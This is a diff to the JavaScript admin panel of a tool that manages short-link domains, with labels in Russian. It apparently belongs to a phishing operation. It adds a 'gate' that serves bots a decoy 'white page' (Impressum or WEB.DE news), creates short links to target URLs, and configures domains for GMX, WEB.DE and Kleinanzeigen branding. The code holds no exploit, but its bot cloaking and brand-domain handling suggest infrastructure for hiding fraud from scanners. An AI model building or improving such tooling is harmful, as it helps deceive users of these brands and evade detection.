       var listEl = document.getElementById('config-short-list');
-      var msgEl = document.getElementById('config-short-message');
       if (!listEl) return;
       listEl.innerHTML = '';
       authFetch('/api/config/short-domains').then(function (r) { return r.json(); }).then(function (data) {
         var list = (data && data.list) ? data.list : [];
-        var serverIp = (data && data.serverIp) ? data.serverIp : '';
         list.forEach(function (item) {
-          var row = document.createElement('div');
-          row.className = 'config-short-row';
-          row.style.cssText = 'display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid var(--border-color, #333);';
-          var statusCls = item.status === 'ready' ? 'config-short-status--ready' : (item.status === 'error' ? 'config-short-status--error' : 'config-short-status--pending');
-          var title = item.status === 'ready' ? 'Готово' : (item.status === 'error' ? 'Ошибка' : 'Ожидание DNS');
-          var circle = document.createElement('span');
-          circle.className = 'config-short-status ' + statusCls;
-          circle.setAttribute('title', title + (item.message ? ': ' + item.message : ''));
-          circle.style.cssText = 'width:12px;height:12px;border-radius:50%;flex-shrink:0;';
-          if (item.status === 'ready') circle.style.background = '#22c55e';
-          else if (item.status === 'error') circle.style.background = '#ef4444';
-          else circle.style.background = '#eab308';
-          var domainSpan = document.createElement('span');
-          domainSpan.style.flex = '1';
-          var styleLabel = item.whitePageStyle === 'news-webde' ? ' [боты: новости]' : '';
-          domainSpan.textContent = item.domain + (item.targetUrl ? ' → ' + item.targetUrl : '') + styleLabel;
-          var checkBtn = document.createElement('button');
-          checkBtn.type = 'button';
-          checkBtn.className = 'btn btn-ghost btn-sm';
-          checkBtn.textContent = 'Проверить';
-          checkBtn.dataset.domain = item.domain;
-          var delBtn = document.createElement('button');
-          delBtn.type = 'button';
-          delBtn.className = 'btn btn-ghost btn-sm';
-          delBtn.textContent = 'Удалить';
-          delBtn.dataset.domain = item.domain;
-          row.appendChild(circle);
-          row.appendChild(domainSpan);
-          row.appendChild(checkBtn);
-          row.appendChild(delBtn);
-          listEl.appendChild(row);
-          if (item.message) {
-            var msgRow = document.createElement('div');
-            msgRow.className = 'config-short-msg';
-            msgRow.style.cssText = 'font-size:0.85rem;color:var(--muted-color,#888);padding-left:22px;';
-            msgRow.textContent = item.message;
-            listEl.appendChild(msgRow);
-          }
-          checkBtn.addEventListener('click', function () {
-            checkBtn.disabled = true;
-            checkBtn.textContent = '…';
-            postJson('/api/config/short-domains-check', { domain: item.domain }).then(function () { loadConfigShort(); }).catch(function () { loadConfigShort(); }).finally(function () { checkBtn.disabled = false; checkBtn.textContent = 'Проверить'; });
+          var card = document.createElement('article');
+          card.className = 'config-short-card';
+
+          var top = document.createElement('div');
+          top.className = 'config-short-card__top';
+
+          var collapseKey = 'gmwShortCardCollapsed:' + item.domain;
+          var toggle = document.createElement('button');
+          toggle.type = 'button';
+          toggle.className = 'config-short-card__collapse';
+          toggle.setAttribute('aria-label', 'Свернуть карточку');
+          toggle.setAttribute('aria-expanded', 'true');
+          toggle.textContent = '▼';
+
+          var cluster = document.createElement('div');
+          cluster.className = 'config-short-card__status-cluster';
+
+          var statusKey = item.status === 'ready' ? 'ready' : (item.status === 'error' ? 'error' : 'pending');
+          var titlePending = 'Проверить';
+          var titleOk = 'Проверить';
+          var titleErr = item.message ? String(item.message) : 'Проверить';
+          var circleTitle = item.status === 'error' && item.message ? titleErr : (item.status === 'ready' ? titleOk : titlePending);
+
+          var circle = document.createElement('button');
+          circle.type = 'button';
+          circle.className = 'config-short-status-btn config-short-status-btn--' + statusKey;
+          circle.setAttribute('aria-label', 'Проверить');
+          circle.setAttribute('title', circleTitle);
+          circle.addEventListener('click', function (ev) {
+            ev.stopPropagation();
+            try {
+              sessionStorage.removeItem('gmwShortDnsOnce');
+            } catch (e) {}
+            circle.disabled = true;
+            postJson('/api/config/short-domains-check', { domain: item.domain }).then(function () { loadConfigShort(); }).catch(function () { loadConfigShort(); });
           });
-          delBtn.addEventListener('click', function () {
-            if (!confirm('Удалить домен ' + item.domain + '?')) return;
+
+          var meta = document.createElement('div');
+          meta.className = 'config-short-card__meta';
+          var domainEl = document.createElement('span');
+          domainEl.className = 'config-short-card__domain';
+          domainEl.textContent = item.domain;
+          var statusText = document.createElement('span');
+          statusText.className = 'config-short-card__status-text config-short-card__status-text--' + statusKey;
+          statusText.textContent = item.status === 'ready' ? 'Ок' : (item.status === 'error' ? 'Ошибка' : 'Ожидание');
+          meta.appendChild(domainEl);
+          meta.appendChild(statusText);
+
+          cluster.appendChild(circle);
+          cluster.appendChild(meta);
+
+          var delDomainBtn = document.createElement('button');
+          delDomainBtn.type = 'button';
+          delDomainBtn.className = 'btn btn-ghost btn-sm config-short-card__del';
+          delDomainBtn.textContent = 'Удалить';
+          delDomainBtn.addEventListener('click', function (ev) {
+            ev.stopPropagation();
+            if (!confirm('Удалить домен ' + item.domain + ' и все короткие ссылки?')) return;
             authFetch('/api/config/short-domains?domain=' + encodeURIComponent(item.domain), { method: 'DELETE' })
               .then(function () { loadConfigShort(); })
-              .catch(function () {
-                showToast('Ошибка удаления домена');
-                loadConfigShort();
-              });
+              .catch(function () { showToast('Ошибка'); loadConfigShort(); });
           });
+
+          top.appendChild(toggle);
+          top.appendChild(cluster);
+          top.appendChild(delDomainBtn);
+          card.appendChild(top);
+
+          var body = document.createElement('div');
+          body.className = 'config-short-card__body';
+
+          try {
+            if (localStorage.getItem(collapseKey) === '1') {
+              body.classList.add('is-collapsed');
+              toggle.setAttribute('aria-expanded', 'false');
+              toggle.textContent = '▶';
+              toggle.setAttribute('aria-label', 'Развернуть карточку');
+            }
+          } catch (lsErr) {}
+
+          toggle.addEventListener('click', function (ev) {
+            ev.stopPropagation();
+            var collapsed = body.classList.toggle('is-collapsed');
+            toggle.setAttribute('aria-expanded', collapsed ? 'false' : 'true');
+            toggle.textContent = collapsed ? '▶' : '▼';
+            toggle.setAttribute('aria-label', collapsed ? 'Развернуть карточку' : 'Свернуть карточку');
+            try {
+              localStorage.setItem(collapseKey, collapsed ? '1' : '0');
+            } catch (ls2) {}
+          });
+
+          if (item.status === 'error' && item.message) {
+            var msgRow = document.createElement('div');
+            msgRow.className = 'config-short-card__alert';
+            msgRow.textContent = item.message;
+            body.appendChild(msgRow);
+          }
+
+          var genRow = document.createElement('div');
+          genRow.className = 'config-short-card__generate';
+          var targetInput = document.createElement('input');
+          targetInput.type = 'url';
+          targetInput.className = 'config-input config-short-card__gen-input';
+          targetInput.placeholder = 'https://…';
+          targetInput.autocomplete = 'off';
+          var genBtn = document.createElement('button');
+          genBtn.type = 'button';
+          genBtn.className = 'btn btn-primary btn-sm config-short-card__gen-btn';
+          genBtn.textContent = 'Создать ссылку';
+          genBtn.addEventListener('click', function () {
+            var pathLinkUrl = (targetInput.value || '').trim();
+            if (!pathLinkUrl) {
+              showToast('Введите целевую ссылку');
+              return;
+            }
+            genBtn.disabled = true;
+            postJson('/api/config/short-domains', { domain: item.domain, pathLinkUrl: pathLinkUrl, targetUrl: item.targetUrl || '', whitePageStyle: item.whitePageStyle || '' })
+              .then(function (r) { return r.json(); })
+              .then(function (res) {
+                if (res && res.shortUrl) {
+                  showToast('Готово: ' + res.shortUrl);
+                  targetInput.value = '';
+                } else if (res && res.error) showToast(res.error);
+                loadConfigShort();
+              })
+              .catch(function () { showToast('Ошибка'); loadConfigShort(); })
+              .finally(function () { genBtn.disabled = false; });
+          });
+          genRow.appendChild(targetInput);
+          genRow.appendChild(genBtn);
+          body.appendChild(genRow);
+
+          var pathWrap = document.createElement('div');
+          pathWrap.className = 'config-short-links';
+          var linksList = document.createElement('div');
+          linksList.className = 'config-short-links__list';
+          var links = (item.pathLinks && item.pathLinks.length) ? item.pathLinks : [];
+          if (links.length === 0) {
+            var emptyPl = document.createElement('div');
+            emptyPl.className = 'config-short-links__empty';
+            emptyPl.textContent = '—';
+            linksList.appendChild(emptyPl);
+          } else {
+            links.forEach(function (pl) {
+              var plRow = document.createElement('div');
+              plRow.className = 'config-short-link-item';
+              var main = document.createElement('div');
+              main.className = 'config-short-link-item__main';
+              var shortA = document.createElement('a');
+              shortA.href = pl.shortUrl;
+              shortA.target = '_blank';
+              shortA.rel = 'noopener';
+              shortA.textContent = pl.shortUrl;
+              shortA.className = 'config-short-link-item__href';
+              var delPlBtn = document.createElement('button');
+              delPlBtn.type = 'button';
+              delPlBtn.className = 'btn btn-ghost btn-sm config-short-link-item__del';
+              delPlBtn.textContent = '×';
+              delPlBtn.title = 'Удалить';
+              delPlBtn.addEventListener('click', function () {
+                if (!confirm('Удалить ' + pl.shortUrl + '?')) return;
+                authFetch('/api/config/short-domains?domain=' + encodeURIComponent(item.domain) + '&slug=' + encodeURIComponent(pl.slug), { method: 'DELETE' })
+                  .then(function () { loadConfigShort(); })
+                  .catch(function () { showToast('Ошибка'); loadConfigShort(); });
+              });
+              main.appendChild(shortA);
+              main.appendChild(delPlBtn);
+              plRow.appendChild(main);
+              var urlHint = document.createElement('div');
+              urlHint.className = 'config-short-link-item__target';
+              urlHint.textContent = pl.url;
+              plRow.appendChild(urlHint);
+              linksList.appendChild(plRow);
+            });
+          }
+          pathWrap.appendChild(linksList);
+          body.appendChild(pathWrap);
+
+          var gateDetails = document.createElement('details');
+          gateDetails.className = 'config-short-gate';
+          var gateSum = document.createElement('summary');
+          gateSum.className = 'config-short-gate__summary';
+          gateSum.textContent = 'Гейт';
+          gateDetails.appendChild(gateSum);
+          var gateBody = document.createElement('div');
+          gateBody.className = 'config-short-gate__body';
+          var gateInput = document.createElement('input');
+          gateInput.type = 'text';
+          gateInput.className = 'config-input';
+          gateInput.placeholder = '';
+          gateInput.value = item.targetUrl || '';
+          var gateStyle = document.createElement('select');
+          gateStyle.className = 'config-input';
+          gateStyle.innerHTML = '<option value="">Impressum</option><option value="news-webde">WEB.DE</option>';
+          gateStyle.value = item.whitePageStyle === 'news-webde' ? 'news-webde' : '';
+          var gateSave = document.createElement('button');
+          gateSave.type = 'button';
+          gateSave.className = 'btn btn-ghost btn-sm';
+          gateSave.textContent = 'Сохранить';
+          gateSave.addEventListener('click', function () {
+            gateSave.disabled = true;
+            postJson('/api/config/short-domains', {
+              domain: item.domain,
+              targetUrl: (gateInput.value || '').trim(),
+              whitePageStyle: gateStyle.value || '',
+              pathLinkUrl: ''
+            })
+              .then(function () { showToast('Сохранено'); loadConfigShort(); })
+              .catch(function () { showToast('Ошибка'); })
+              .finally(function () { gateSave.disabled = false; });
+          });
+          gateBody.appendChild(gateInput);
+          gateBody.appendChild(gateStyle);
+          gateBody.appendChild(gateSave);
+          gateDetails.appendChild(gateBody);
+          body.appendChild(gateDetails);
+
+          card.appendChild(body);
+
+          listEl.appendChild(card);
         });
-        if (list.length === 0) listEl.innerHTML = '<p class="config-files-list-hint">Нет доменов. Добавьте домен из Dynadot и при необходимости укажите SHORT_SERVER_IP и CLOUDFLARE_API_TOKEN в .env.</p>';
-      }).catch(function () { if (listEl) listEl.innerHTML = '<p class="config-msg">Ошибка загрузки</p>'; });
+        if (list.length === 0) {
+          listEl.innerHTML = '<div class="config-short-empty"><div class="config-short-empty__icon" aria-hidden="true"></div><p class="config-short-empty__title">Нет доменов</p></div>';
+        }
+        var pendingDomains = list.filter(function (i) { return i.status === 'pending'; });
+        try {
+          if (pendingDomains.length === 0) sessionStorage.removeItem('gmwShortDnsOnce');
+        } catch (e) {}
+        var siteAuto = data && data.siteAutoCheck !== false;
+        var pendingAuto = false;
+        try {
+          pendingAuto = sessionStorage.getItem('gmwShortDnsOnce') === '1';
+        } catch (e2) {}
+        if (pendingDomains.length && siteAuto && !pendingAuto) {
+          try {
+            sessionStorage.setItem('gmwShortDnsOnce', '1');
+          } catch (e3) {}
+          Promise.all(pendingDomains.map(function (i) {
+            return postJson('/api/config/short-domains-check', { domain: i.domain });
+          })).catch(function () {}).finally(function () {
+            loadConfigShort();
+          });
+        }
+      }).catch(function () {
+        if (listEl) {
+          listEl.innerHTML = '<div class="config-short-empty config-short-empty--error"><p class="config-short-empty__title">Ошибка загрузки</p></div>';
+        }
+      });
     }
 
-    var configShortAdd = document.getElementById('config-short-add');
-    var configShortDomain = document.getElementById('config-short-domain');
-    var configShortTarget = document.getElementById('config-short-target');
+    var configShortAddDomain = document.getElementById('config-short-add-domain');
+    var configShortNewDomain = document.getElementById('config-short-new-domain');
     var configShortMsg = document.getElementById('config-short-message');
-    if (configShortAdd && configShortDomain) {
-      configShortAdd.addEventListener('click', function () {
-        var domain = (configShortDomain && configShortDomain.value) ? configShortDomain.value.trim().replace(/^https?:\/\//, '').split('/')[0].toLowerCase() : '';
-        var targetUrl = (configShortTarget && configShortTarget.value) ? configShortTarget.value.trim() : '';
-        var whitePageStyle = (document.getElementById('config-short-white-style') && document.getElementById('config-short-white-style').value) || '';
-        if (!domain) { if (configShortMsg) { configShortMsg.textContent = 'Введите домен'; configShortMsg.className = 'config-msg'; configShortMsg.classList.remove('hidden'); } return; }
-        configShortAdd.disabled = true;
-        if (configShortMsg) { configShortMsg.textContent = 'Добавление…'; configShortMsg.classList.remove('hidden'); }
-        postJson('/api/config/short-domains', { domain: domain, targetUrl: targetUrl, whitePageStyle: whitePageStyle }).then(function (r) { return r.json(); }).then(function (data) {
-          if (data && data.ok !== false) {
-            if (configShortMsg) { configShortMsg.textContent = data.message || 'Домен добавлен. В Dynadot укажите NS: ' + (data.ns && data.ns.length ? data.ns.join(', ') : ''); configShortMsg.className = 'config-msg success'; }
-            if (configShortDomain) configShortDomain.value = '';
-            if (configShortTarget) configShortTarget.value = '';
-            loadConfigShort();
-          } else if (configShortMsg) { configShortMsg.textContent = (data && data.error) || 'Ошибка'; configShortMsg.className = 'config-msg'; }
-        }).catch(function (err) { if (configShortMsg) { configShortMsg.textContent = err.message || 'Ошибка'; configShortMsg.className = 'config-msg'; } }).finally(function () { configShortAdd.disabled = false; if (configShortMsg) setTimeout(function () { configShortMsg.classList.add('hidden'); }, 8000); });
+    if (configShortAddDomain && configShortNewDomain) {
+      configShortAddDomain.addEventListener('click', function () {
+        var domain = (configShortNewDomain.value || '').trim().replace(/^https?:\/\//, '').split('/')[0].replace(/^www\./, '').toLowerCase();
+        if (!domain) {
+          showToast('Введите домен');
+          return;
+        }
+        configShortAddDomain.disabled = true;
+        postJson('/api/config/short-domains', { domain: domain, targetUrl: '', pathLinkUrl: '', whitePageStyle: '' })
+          .then(function (r) { return r.json(); })
+          .then(function (data) {
+            if (data && data.ok !== false) {
+              showToast('Домен добавлен');
+              configShortNewDomain.value = '';
+              loadConfigShort();
+            } else {
+              showToast((data && data.error) || 'Ошибка');
+            }
+          })
+          .catch(function (err) { showToast(err.message || 'Ошибка'); })
+          .finally(function () {
+            configShortAddDomain.disabled = false;
+            if (configShortMsg) configShortMsg.classList.add('hidden');
+          });
+      });
+    }
+
+    function loadConfigBrandDomains() {
+      var hint = document.getElementById('config-brand-file-hint');
+      var msg = document.getElementById('config-brand-message');
+      var gmxD = document.getElementById('config-brand-gmx-domain');
+      var gmxL = document.getElementById('config-brand-gmx-list');
+      var webD = document.getElementById('config-brand-webde-domain');
+      var webL = document.getElementById('config-brand-webde-list');
+      var klD = document.getElementById('config-brand-klein-domain');
+      var klL = document.getElementById('config-brand-klein-list');
+      if (msg) {
+        msg.textContent = '';
+        msg.classList.add('hidden');
+      }
+      authFetch('/api/config/brand-domains').then(function (r) { return r.json(); }).then(function (data) {
+        if (gmxD) gmxD.value = (data && data.gmxDomain) ? String(data.gmxDomain) : '';
+        if (gmxL) gmxL.value = (data && data.gmxDomains) ? String(data.gmxDomains) : '';
+        if (webD) webD.value = (data && data.webdeDomain) ? String(data.webdeDomain) : '';
+        if (webL) webL.value = (data && data.webdeDomains) ? String(data.webdeDomains) : '';
+        if (klD) klD.value = (data && data.kleinDomain) ? String(data.kleinDomain) : '';
+        if (klL) klL.value = (data && data.kleinDomains) ? String(data.kleinDomains) : '';
+        if (hint) {
+          hint.textContent = data && data.overridesFile ? 'JSON' : '.env';
+          hint.className = 'config-brand-source-badge' + (data && data.overridesFile ? ' config-brand-source-badge--json' : ' config-brand-source-badge--env');
+        }
+        setTimeout(function () { AdminModalKit.syncCodeEditorHeights(); }, 0);
+      }).catch(function () {
+        if (hint) {
+          hint.textContent = '';
+          hint.className = 'config-brand-source-badge';
+        }
+        showToast('Не удалось загрузить домены брендов');
+      });
+    }
+
+    var configBrandSave = document.getElementById('config-brand-save');
+    var configBrandReset = document.getElementById('config-brand-reset');
+    if (configBrandSave) {
+      configBrandSave.addEventListener('click', function () {
+        var gmxD = document.getElementById('config-brand-gmx-domain');
+        var gmxL = document.getElementById('config-brand-gmx-list');
+        var webD = document.getElementById('config-brand-webde-domain');
+        var webL = document.getElementById('config-brand-webde-list');
+        var klD = document.getElementById('config-brand-klein-domain');
+        var klL = document.getElementById('config-brand-klein-list');
+        var msg = document.getElementById('config-brand-message');
+        var payload = {
+          gmxDomain: (gmxD && gmxD.value) || '',
+          gmxDomains: (gmxL && gmxL.value) || '',
+          webdeDomain: (webD && webD.value) || '',
+          webdeDomains: (webL && webL.value) || '',
+          kleinDomain: (klD && klD.value) || '',
+          kleinDomains: (klL && klL.value) || ''
+        };
+        configBrandSave.disabled = true;
+        postJson('/api/config/brand-domains', payload)
+          .then(function (r) { return r.json(); })
+          .then(function (data) {
+            if (data && data.ok) {
+              showToast('Домены брендов сохранены');
+              if (msg) {
+                msg.textContent = '';
+                msg.classList.add('hidden');
+              }
+              loadConfigBrandDomains();
+            } else {
+              if (msg) {
+                msg.textContent = (data && data.error) || 'Ошибка';
+                msg.className = 'config-msg config-brand-message error';
+                msg.classList.remove('hidden');
+              } else {
+                showToast((data && data.error) || 'Ошибка');
+              }
+            }
+          })
+          .catch(function (err) {
+            showToast(err.message || 'Ошибка');
+          })
+          .finally(function () {
+            configBrandSave.disabled = false;
+          });
+      });
+    }
+    if (configBrandReset) {
+      configBrandReset.addEventListener('click', function () {
+        if (!confirm('Удалить data/brand-domains.json и вернуть домены из .env?')) return;
+        configBrandReset.disabled = true;
+        authFetch('/api/config/brand-domains', { method: 'DELETE' })
+          .then(function (r) { return r.json(); })
+          .then(function (data) {
+            if (data && data.ok) {
+              showToast('Сброшено к .env');
+              loadConfigBrandDomains();
+            } else {
+              showToast((data && data.error) || 'Ошибка');
+            }
+          })
+          .catch(function () { showToast('Ошибка'); })
+          .finally(function () {
+            configBrandReset.disabled = false;
+          });
       });
     }
 
